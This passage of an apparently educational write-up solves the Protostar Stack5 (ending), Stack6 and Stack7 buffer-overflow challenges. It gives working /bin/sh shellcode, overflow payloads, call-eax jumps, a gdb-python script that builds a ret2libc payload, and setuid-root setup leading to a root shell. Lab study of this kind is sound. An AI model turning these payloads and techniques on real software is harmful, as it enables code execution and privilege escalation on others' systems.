$ python2 -c 'print "A"*53' >> exploit.bin 

$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 000a
```

As seen on the output above, there is a **newline character** in our exploit **0a41**. This can be a badchar for our target binary. To be avoid of terminations we can use the following python code below, be sure you deleted and compiled the **exploit.bin** again.

```x86asm
$ python2 -c 'import sys; sys.stdout.write("A"*53)' >> exploit.bin

$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141
```

76 bytes can be sent by using this exploit so far, we are now able to write anything to **eip** register. The first bytes aka. **shellcode** should be overwritten onto **eax** register.  

We need an address of **call eax** instruction in our binary to jump to our shellcode by writing its address onto **eip** register.

```x86asm
$ objdump -d 5 -M intel | grep "call"
...TRIM...
 8048386:	ff d0                	call   eax
...TRIM...
 804840f:	ff d0                	call   eax
```

Let's use the address **8048386** in our exploit.
```x86asm
$ echo -ne "\x86\x83\x04\x08" >> exploit.bin
```

Final exploit.

```x86asm
c@ubuntu:~/Desktop/protostar$ hexdump -v exploit.bin 
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 8386 0804
```

Let's check if this exploit works properly or not by debugging.

```nasm
gdb-peda$ b * 0x0804842d
gdb-peda$ b * 0x08048386

gdb-peda$ r < exploit.bin

gdb-peda$ x/20wx $eax
0xffffd0e0:	0x6850c031	0x68732f6e	0x622f2f68	0x31e38969
0xffffd0f0:	0xb0d231c9	0x4180cd0b	0x41414141	0x41414141
0xffffd100:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd110:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd120:	0x41414141	0x41414141	0x41414141	0x08048386

gdb-peda$ i r eip
eip            0x8048386	0x8048386 <deregister_tm_clones+38>

gdb-peda$ c
Continuing.
process 6220 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x804842d
```

As seen on the outpu of **x/20wx $eax** command in gdb, we have obtained our goal. 

My debugger has some issues, but **/bin/dash** was executed. Let's finish this off in **Final PoC** part of this walkthrough.


#### 2.3 Final PoC

```py
python2 -c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A"*53 + "\x86\x83\x04\x08")' > exploit.bin
```

Privilege escalation set up.

```js
$ sudo chown root 5
$ sudo chmod u+s 5
$ ls -l 5
-rwsrwxr-x 1 root c 8264 Mar  1 04:57 5

$ socat -dd TCP4-LISTEN:"8080",fork,reuseaddr EXEC:"./5",pty,echo=0,raw
```

From another terminal.

```js
$ (cat exploit.bin; cat) | nc localhost 8080
id
uid=1000(c) gid=1000(c) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(c)
whoami
root
```

## Protostar-Stack6 Solution

### 1. Introduction

This is a poc solution for the "Stack6" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20140405142902/http://exploit-exercises.com/protostar/stack6](https://web.archive.org/web/20140405142902/http://exploit-exercises.com/protostar/stack6) 

**Hints:**
* Stack6 looks at what happens when you have restrictions on the return address.
* This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.
* It is strongly suggested you experiment with multiple ways of getting your code to execute here.


#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
 
void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath(); 
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 6 6.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Disassemble the main function.
2. Find offset.

```nasm
gdb-peda$ r <<< $(python -c "print 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'")

...TRIM...
Stopped reason: SIGSEGV
0x41414b41 in ?? ()
gdb-peda$ i r ebp eip
ebp            0x41354141	0x41354141
eip            0x41414b41	0x41414b41

gdb-peda$ x/wx $esp
0xffffd110:	0x36414167

gdb-peda$ pattern offset 0x36414167
910246247 found at offset: 93
gdb-peda$ pattern offset 0x41354141
1094009153 found at offset: 85
gdb-peda$ pattern offset 0x41414b41
1094798145 found at offset: 89
```

The payload that we send to binary fits as below:

```
[offset = 80]+[ebp = 85]+[eip = 89]+[esp = 93] 
      1...80 +  81...84 +  85...88 +  89...92
```

```nasm
gdb-peda$ r <<< $(python -c "print 'A'*80+'B'*4+'C'*80") 

gdb-peda$ i r ebp eip
ebp            0x41414141	0x41414141
eip            0x42424242	0x42424242
gdb-peda$ x/wx $esp
0xffffd110:	0x43434343
```

As seen on the source code of this challenge, we are no able to use return pointer. The if condition on the code checks if return address starts from **0xbf000000**. I compiled this one on my vm and stack doesn't start from 0xbf...


#### 2.1 Solving with NX Enabled

To make this challenge more pragmatic let me re-compile with **stack execution disabled aka. nx enabled** (without **-z execstack** parameter). As mentioned in hints section of the challenge, this one recommends to use **ret2libc** or **rop** so let me try to solve with ret2libc.

**Before**
```
gdb-peda$ checksec
NX        : disabled

$ readelf -l 6 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```
**After**
```
gdb-peda$ checksec
NX        : ENABLED

$ readelf -l stack6_nx | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

Ret2libc attacks are explained in many resources which are available online so there is only a quick overview for the solution.

As far as I know return-to-libc attack is one of the code re-use attacks. libc is used in this attack because it contains functions like execve(), system()... etc.
I used execve() on the solution for Stack-5, this time I'm using system(). It needs an argument such as "/bin/sh" to create a bash shell. 

```
system("/bin/bash");  
```

In this attack the stack looks like following:
```
Top - Lower Memory<== 
[offset+ebp] + [eip: addr of called func in libc] + [Ret. addr for called func] + [str ptr: Args of called func]

==>Higher Memory - Bottom
```
It will be implemented to the following format in our solve to let program exit without any errors:

```
[offset] + [system() address] + [exit address] + [/bin/sh address]
```

I'd like to tell why we put **return address for called function** between *addr. of func* and *args. of function*.

As you can see in the web page below, call instruction is used to call a function by performing two operations:

1. It pushes the return address (address immediately after the CALL instruction) on the stack.
2. It changes EIP to the call destination. This effectively transfers control to the call target and begins execution there.

[https://www.aldeid.com/wiki/X86-assembly/Instructions/call](https://www.aldeid.com/wiki/X86-assembly/Instructions/call)

By using our payload, we simulate the **call** instruction manually.

#### 2.2 Quick Solution

Let's check addresses from gdb, then create a simple gdb-py script.

```py
(gdb) break main
 
(gdb) run   

(gdb) info address system
Symbol "system" is at 0xf7e51e70 in a file compiled without debugging.

(gdb) info address exit
Symbol "exit" is at 0xf7e44f50 in a file compiled without debugging.

(gdb) find &system,+9999999,"/bin/sh"
0xf7f71fcc
```

The search process for the address of **/bin/sh** can be done better as I mentioned in **2.3 Improvements for The Solution** section.

Payload can be created in the following format:

**offset + system_address + exit_address + binsh_address**

**The gdb-python script that I wrote:**

```py
from gdb import execute
from re import findall 
from struct import pack

def extract_address(input_string):
	return findall(r"0[xX][0-9a-fA-F]+",input_string)

execute('file stack6_nx')
execute('b main')
execute('r')

offset = "\x41" * 80
exit_address = extract_address(execute('info address exit', to_string=True))[0]
system_address = extract_address(execute('info address system', to_string=True))[0]
binsh_address = extract_address(execute('find &system,+9999999,"/bin/sh"', to_string=True))[0]

print("system address: "+str(system_address)+"\nexit_ address: "+str(exit_address)+"\nbinsh_address: "+str(binsh_address))

print("Payload will be: \noffset + system_address + exit_address + binsh_address\n")

system_address = pack("I", int(system_address[2:],16))
exit_address = pack("I", int(exit_address[2:],16))
bin_sh = pack("I",int(binsh_address[2:],16))

payload = b'\x41'*80 + system_address + exit_address + bin_sh

print("Payload as a bytearray:")
print(payload)

f = open('/tmp/exploit', 'wb')
f.write(payload)
f.close()

print("Payload file is: /tmp/exploit")
print("You can try by using following command: '  (cat /tmp/exploit; cat) | ./stack6_nx'")
```

You can use the script from gdb by using the following command:
**source script.py**  (equivalent to running gdb -x script.py).

```
(gdb) source x.py 
Breakpoint 2 at 0x8048546: file stack6_nx.c, line 28.

Breakpoint 1, main (argc=1, argv=0xffffd1d4) at stack6_nx.c:28
warning: Source file is more recent than executable.
28	
system address: 0xf7e51e70
exit_ address: 0xf7e44f50
binsh_address: 0xf7f71fcc
Payload will be: 
offset + system_address + exit_address + binsh_address

Payload as a bytearray:
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp\x1e\xe5\xf7PO\xe4\xf7\xcc\x1f\xf7\xf7'
Payload file is: /tmp/exploit
You can try by using following command: '  (cat /tmp/exploit; cat) | ./stack6_nx '
```

```
$ (cat /tmp/exploit; cat) | ./stack6_nx
input path please: id
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��AAAAAAAAAAAAp��PO�����id
id
uid=1000(a) gid=1000(a) groups=1000(a),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

#### 2.3 Improvements for The Solution

1. Checking only address space of **libc** instead of iterating a lot ('find &system,+9999999,"/bin/sh"').

**This is how it can be done by following commands:**

```
$ ldd ./stack6_nx | grep libc
	libc.so.6 => /lib32/libc.so.6 (0xf7e12000)

$ readelf -s /lib32/libc.so.6 | grep system
   243: 00118e50    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 0003fe70    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

readelf -s /lib32/libc.so.6 | grep exit
$ readelf -s /lib32/libc.so.6 | grep exit
   111: 00033380    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   139: 00032f50    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   ...

Now finding "/bin/sh" from gdb:
(gdb) i proc map
process 13201
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
...TRIM...
	0xf7e12000 0xf7fba000   0x1a8000        0x0 /lib32/libc-2.19.so
	0xf7fba000 0xf7fbc000     0x2000   0x1a7000 /lib32/libc-2.19.so
	0xf7fbc000 0xf7fbd000     0x1000   0x1a9000 /lib32/libc-2.19.so
...TRIM...

(gdb) find 0xf7e12000,0xf7fbd000,"/bin/sh"
0xf7f71fcc
1 pattern found.

(gdb) x/s  0xf7f71fcc
0xf7f71fcc:	"/bin/sh"
```

2. Using **execve()** instead of **system()** might be better. Many people complains because of **system()** is not supported on their hosts. Be careful, execve() takes 3 args.

3. Using ENV variables can be an option to use as the function argument ("**SHELL=/bin/bash**").


#### 2.4 Final PoC

Following did not work for me, but it might work on yours:
```
(gdb) source x.py 
...TRIM...
(gdb) r <<< $(cat /tmp/exploit)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: stack6_nx <<< $(cat /tmp/exploit)
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��AAAAAAAAAAAAp��PO����
[Inferior 1 (process 13214) exited normally]

(gdb) r < /tmp/exploit 
Starting program: stack6_nx < /tmp/exploit
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��AAAAAAAAAAAAp��PO����
[Inferior 1 (process 13639) exited normally]
```

```
$ (cat /tmp/exploit; cat) | ./stack6_nx
```

#### 2.5 Limitations of ret2libc

1. If functions are removed from libc/library.
2. If mitigations are used such as [ASCII Armoring](https://en.wikipedia.org/wiki/Binary-to-text_encoding#ASCII_armor): libc addresses contain a NULL byte (0x00). Then attacker can check for **return2plt** attack (system@plt etc).
3. If ASLR is used.


## Protostar-Stack7 Solution

### 1. Introduction

This is a poc solution for the "Stack7" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419082500/https://exploit-exercises.com/protostar/stack7/](https://web.archive.org/web/20170419082500/https://exploit-exercises.com/protostar/stack7/) 

**Hints:**
* Stack6 introduces return to .text to gain code execution.
* The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.


#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o stack7 stack7.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb

This one is similar to stack5 since we're able to write our payload onto eax register.

#### 2.2 Quick Solution

Let's use same payload from stack 5, exploit.bin by increasing the offset by 3.

```
$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 0080

$ python2 -c 'import sys; sys.stdout.write("A"*57)' >> exploit.bin

$ hexdump -v exploit.bin 
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 4141 4141
```

Let's find a **call eax** instruction from stack7 binary.

```nasm
$ objdump -d stack7 -M intel | grep "call" | grep "eax"
 8048466:	ff d0                	call   eax
 80484ef:	ff d0                	call   eax
```


Let's choose the address **8048466** in our exploit.

```x86asm
$ echo -ne "\x66\x84\x04\x08" >> exploit.bin
```

Final exploit.

```x86asm
$ hexdump -v exploit.bin 
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 4141 4141
0000050 8466 0804 
```

Following outputs is from another vm which has peda installed.

```nasm
gdb-peda$ r < exploit.bin
Starting program: stack7 < exploit.bin
input path please: got path 1�Phn/shh//bi��1�1Ұ
...TRIM...
[----------------------------------registers-----------------------------------]
EAX: 0x804b008 --> 0x6850c031 
EIP: 0x804b008 --> 0x6850c031
...TRIM...               
-------------------------------------code-------------------------------------                  0x804b001:	add    BYTE PTR [eax],al
   0x804b003:	add    BYTE PTR [ecx+0x0],ah
   0x804b006:	add    BYTE PTR [eax],al
=> 0x804b008:	xor    eax,eax  <== Our shellcode
   0x804b00a:	push   eax
   0x804b00b:	push   0x68732f6e
   0x804b010:	push   0x69622f2f
   0x804b015:	mov    ebx,esp            
...TRIM...                                              
gdb-peda$ x/21wx $eax
0x804b008:	0x6850c031	    0x68732f6e	0x622f2f68	0x31e38969
0x804b018:	0xb0d231c9	    0x4180cd0b	0x41414141	0x41414141
0x804b028:	0x41414141	    0x41414141	0x41414141	0x41414141
0x804b038:	0x41414141	    0x41414141	0x41414141	0x41414141
0x804b048:	=>0x08048466<=	0x41414141	0x41414141	0x41414141
0x804b058:	0x08048466
```
There is something wrong with data that I write on **eax** on debugger but it worked on another VM which doesn't have gdb-peda. 

Final poc works properly as well.

#### 2.3 Final PoC

```py
$ python2 -c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A"*57 + "\x66\x84\x04\x08")' > x.bin

$ (cat x.bin; cat) | ./stack7
input path please: X
got path 1�Phn/shh//bi��1�1Ұ
                            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf�AAAAAAAAAAAAf�X
id
uid=1000(a) gid=1000(a) groups=1000(a),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```
